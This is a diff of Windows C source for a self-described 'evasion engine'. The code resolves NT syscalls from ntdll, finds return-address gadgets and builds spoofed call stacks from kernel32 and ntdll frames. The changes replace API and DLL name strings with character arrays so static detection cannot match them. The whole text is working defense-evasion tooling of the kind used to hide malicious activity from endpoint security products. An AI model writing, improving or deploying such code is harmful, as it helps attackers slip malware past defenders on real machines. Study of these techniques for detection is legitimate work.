@@ -74,8 +74,11 @@ DWORD64 GetSSN(PVOID pAddress) {
 
 // Calculates the stack frame size of a target function by reading its .pdata
 DWORD CalcFrameSize(PVOID pFunc) {
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
-    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, "RtlLookupFunctionEntry");
+    char sK32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
+    char sRtl[] = {'R','t','l','L','o','o','k','u','p','F','u','n','c','t','i','o','n','E','n','t','r','y',0};
+    
+    HMODULE hK32 = GetModuleHandleA(sK32);
+    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, sRtl);
     if(!RtlLookup) return DEFAULT_FRAME_SIZE;
     
     DWORD64 ImageBase;
@@ -160,10 +163,13 @@ PVOID SeekReturnAddress(PVOID pBase) {
     if (!pBase) return NULL;
 
     // Determine the exact function size via .pdata to bound the scan
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
-    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, "RtlLookupFunctionEntry");
+    char sK32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
+    char sRtl[] = {'R','t','l','L','o','o','k','u','p','F','u','n','c','t','i','o','n','E','n','t','r','y',0};
+    
+    HMODULE hK32 = GetModuleHandleA(sK32);
+    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)GetProcAddress(hK32, sRtl);
 
-    DWORD scanLimit = 256; // fallback limit if .pdata lookup fails
+    DWORD scanLimit = 256; // Fallback limit if .pdata lookup fails
 
     if (RtlLookup) {
         DWORD64 ImageBase;
@@ -179,11 +185,11 @@ PVOID SeekReturnAddress(PVOID pBase) {
     PBYTE pBytes = (PBYTE)pBase;
 
     for (DWORD i = 0; i < scanLimit; i++) {
-        // 'CALL QWORD PTR [RIP+offset]' (FF 15) — 6 bytes
+        // 'CALL QWORD PTR [RIP+offset]' (FF 15) - 6 bytes
         if (i + 6 <= scanLimit && pBytes[i] == 0xFF && pBytes[i+1] == 0x15)
             return (PVOID)(pBytes + i + 6);
 
-        // Relative CALL (E8) — 5 bytes
+        // Relative CALL (E8) - 5 bytes
         if (i + 5 <= scanLimit && pBytes[i] == 0xE8)
             return (PVOID)(pBytes + i + 5);
     }
@@ -195,24 +201,32 @@ PVOID SeekReturnAddress(PVOID pBase) {
 
 // Initializes the evasion engine, locates gadgets, masks and parses NTDLL
 BOOL InitEngine() {
-    PVOID ntdllBase = GetModuleHandleA("ntdll.dll");
-    if(!ntdllBase) return FALSE;
+    char sNtdll[] = {'n','t','d','l','l','.','d','l','l',0};
+    HMODULE hNtdll = GetModuleHandleA(sNtdll);
+    if(!hNtdll) return FALSE;
     
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdllBase;
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pDos->e_lfanew);
-    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
-    PDWORD pdwFunctions = (PDWORD)((PBYTE)ntdllBase + pExport->AddressOfFunctions);
-    PDWORD pdwNames = (PDWORD)((PBYTE)ntdllBase + pExport->AddressOfNames);
-    PWORD pwOrdinals = (PWORD)((PBYTE)ntdllBase + pExport->AddressOfNameOrdinals);
-    
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
-    // HMODULE hKBase = GetModuleHandleA("kernelbase.dll");
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
+    PDWORD pdwFunctions = (PDWORD)((PBYTE)hNtdll + pExport->AddressOfFunctions);
+    PDWORD pdwNames = (PDWORD)((PBYTE)hNtdll + pExport->AddressOfNames);
+    PWORD pwOrdinals = (PWORD)((PBYTE)hNtdll + pExport->AddressOfNameOrdinals);
+
+    char sK32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
+    char sVP[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t','E','x',0};
+    char sCP[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','W',0};
+    char sMV[] = {'M','a','p','V','i','e','w','O','f','F','i','l','e',0};
+    char sMF[] = {'M','o','v','e','F','i','l','e','W',0};
+    char sBT[] = {'B','a','s','e','T','h','r','e','a','d','I','n','i','t','T','h','u','n','k',0};
+    char sRU[] = {'R','t','l','U','s','e','r','T','h','r','e','a','d','S','t','a','r','t',0};
+
+    HMODULE hK32 = GetModuleHandleA(sK32);
     
     // Initialize global spoofing masks dynamically
-    Mask_Security.pAddress = SeekReturnAddress(GetProcAddress(hK32, "VirtualProtectEx"));
-    Mask_Worker.pAddress   = SeekReturnAddress(GetProcAddress(hK32, "CreateProcessW"));
-    Mask_Memory.pAddress   = SeekReturnAddress(GetProcAddress(hK32, "MapViewOfFile"));
-    Mask_File.pAddress     = SeekReturnAddress(GetProcAddress(hK32, "MoveFileW"));
+    Mask_Security.pAddress = SeekReturnAddress(GetProcAddress(hK32, sVP));
+    Mask_Worker.pAddress = SeekReturnAddress(GetProcAddress(hK32, sCP));
+    Mask_Memory.pAddress = SeekReturnAddress(GetProcAddress(hK32, sMV));
+    Mask_File.pAddress = SeekReturnAddress(GetProcAddress(hK32, sMF));
 
     // Calculate exact frame sizes for the masks based on the new Return Addresses
     Mask_Security.dwFrameSize = CalcFrameSize(Mask_Security.pAddress);
@@ -221,8 +235,8 @@ BOOL InitEngine() {
     Mask_File.dwFrameSize     = CalcFrameSize(Mask_File.pAddress);
     
     // Configure Stack Spoofing basis dynamically
-    qThreadBase = SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(hK32, "BaseThreadInitThunk")));
-    qRtlUserThreadStart = SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(ntdllBase, "RtlUserThreadStart")));
+    qThreadBase = SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(hK32, sBT)));
+    qRtlUserThreadStart = SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(hNtdll, sRU)));
     
     if(!qThreadBase || !qRtlUserThreadStart) return FALSE;
     
@@ -230,9 +244,9 @@ BOOL InitEngine() {
     qRtlUserThreadStartFrame = CalcFrameSize(qRtlUserThreadStart);
     
     // Find a valid gadget (fallback to ntdll if kernel32 fails)
-    qGadgetAddress = FindValidGadgetInModule("kernel32.dll", &qGadgetType, 0x100, &qFrameSize);
+    qGadgetAddress = FindValidGadgetInModule(sK32, &qGadgetType, 0x100, &qFrameSize);
     if (!qGadgetAddress) {
-        qGadgetAddress = FindValidGadgetInModule("ntdll.dll", &qGadgetType, 0x100, &qFrameSize);
+        qGadgetAddress = FindValidGadgetInModule(sNtdll, &qGadgetType, 0x100, &qFrameSize);
     }
     if (!qGadgetAddress) return FALSE;
     
@@ -241,8 +255,8 @@ BOOL InitEngine() {
     // Resolve Syscalls
     DWORD idx = 0;
     for (WORD i = 0; i < pExport->NumberOfNames; i++) {
-        PCHAR pcName = (PCHAR)((PBYTE)ntdllBase + pdwNames[i]);
-        PVOID pAddress = (PBYTE)ntdllBase + pdwFunctions[pwOrdinals[i]];
+        PCHAR pcName = (PCHAR)((PBYTE)hNtdll + pdwNames[i]);
+        PVOID pAddress = (PBYTE)hNtdll + pdwFunctions[pwOrdinals[i]];
         
         USHORT prefix = *(USHORT*)pcName;
         if (prefix != 0x744E && prefix != 0x775A) continue; // Filter for 'Nt' or 'Zw'
